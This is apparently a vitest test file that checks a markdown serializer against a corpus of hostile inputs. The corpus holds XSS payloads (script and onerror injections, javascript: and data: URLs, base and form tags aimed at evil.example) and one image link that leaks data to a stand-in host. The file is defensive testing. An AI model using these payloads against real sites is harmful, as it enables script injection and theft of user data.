/** The hostile-payload corpus: markdown -> Node -> string may never yield executable markup. */

import { describe, expect, it } from 'vitest'
import { markdown } from '../src/markdown.ts'
import { SafeUrl } from '../src/node.ts'
import { serializeAll } from '../src/serialize.ts'

/**
 * Every tag this vocabulary can produce. Anything outside it in rendered output
 * means an escape was missed, so the corpus asserts on the tag set rather than
 * on substrings, which escaped text legitimately contains.
 */
const ALLOWED_TAG =
  /^<\/?(?:p|em|strong|li|ul|ol|blockquote|pre|code|a)(?: class="lang-[^"<>]*"| href="[^"<>]*" rel="noreferrer noopener")?>$/

/** Render markdown the way the transcript route does. */
function html(source: string): string {
  return serializeAll(markdown(source))
}

const HOSTILE: readonly string[] = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '[click](javascript:alert(1))',
  '[click](JaVaScRiPt:alert(1))',
  '[click](  javascript:alert(1))',
  '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[click](vbscript:msgbox(1))',
  '[x](https://ok.example/"onmouseover="alert(1))',
  '```\n</code></pre><script>alert(1)</script>\n```',
  '`</code><script>alert(1)</script>`',
  '**<script>alert(1)</script>**',
  '> <script>alert(1)</script>',
  '- <img src=x onerror=alert(1)>',
  '# <script>alert(1)</script>',
  'http://ok.example/<script>alert(1)</script>',
  '<a href="javascript:alert(1)">x</a>',
  '<style>body{display:none}</style>',
  '<base href="https://evil.example/">',
  '<form action="https://evil.example/"><input name=x></form>',
  '<!--><script>alert(1)</script>-->',
  '<math><mtext><script>alert(1)</script></mtext></math>',
]

describe('serializer', () => {
  it.each(HOSTILE)('emits only vocabulary tags for %j', payload => {
    for (const tag of html(payload).match(/<[^>]*>/g) ?? []) {
      expect(tag).toMatch(ALLOWED_TAG)
    }
  })

  it.each(HOSTILE)('puts no live href on a refused scheme for %j', payload => {
    for (const [, href] of html(payload).matchAll(/<a href="([^"]*)"/g)) {
      expect(() => SafeUrl(decode(href ?? ''))).not.toThrow()
    }
  })

  it('keeps a fenced block containing its own closing tag intact', () => {
    const output = html('```\n</code></pre>\n```')
    expect(output).toBe('<pre><code>&lt;/code&gt;&lt;/pre&gt;</code></pre>')
  })

  it('preserves fenced text exactly once decoded', () => {
    const body = 'if (a < b && c > d) { return "x" }'
    const output = html(`\`\`\`ts\n${body}\n\`\`\``)
    expect(output).toContain('class="lang-ts"')
    expect(decode(output)).toContain(body)
  })

  it('admits ordinary links and marks them noreferrer', () => {
    expect(html('[docs](https://example.com/a?b=1)')).toBe(
      '<p><a href="https://example.com/a?b=1" rel="noreferrer noopener">docs</a></p>',
    )
  })

  it('shows a refused href as readable text rather than dropping it', () => {
    const output = html('[click](javascript:alert(1))')
    expect(output).not.toContain('<a ')
    expect(decode(output)).toContain('javascript:alert(1)')
  })

  it('has no image variant, so nothing auto-fetches', () => {
    expect(html('![leak](https://evil.example/x.png?data=secret)')).not.toContain('<img')
  })

  it('refuses protocol-relative and unknown schemes at mint time', () => {
    expect(() => SafeUrl('//evil.example/x')).toThrow(TypeError)
    expect(() => SafeUrl('javascript:alert(1)')).toThrow(TypeError)
    expect(() => SafeUrl('data:text/html,x')).toThrow(TypeError)
    expect(() => SafeUrl('')).toThrow(TypeError)
  })

  it('admits the schemes a transcript needs', () => {
    expect(SafeUrl('https://a.example/x')).toBe('https://a.example/x')
    expect(SafeUrl('mailto:a@b.example')).toBe('mailto:a@b.example')
    expect(SafeUrl('/s/abc')).toBe('/s/abc')
  })
})

/** Decode the entities the serializer emits, to assert on the reader's view. */
function decode(value: string): string {
  return value
    .replaceAll('&lt;', '<').replaceAll('&gt;', '>')
    .replaceAll('&quot;', '"').replaceAll('&#39;', "'")
    .replaceAll('&amp;', '&')
}
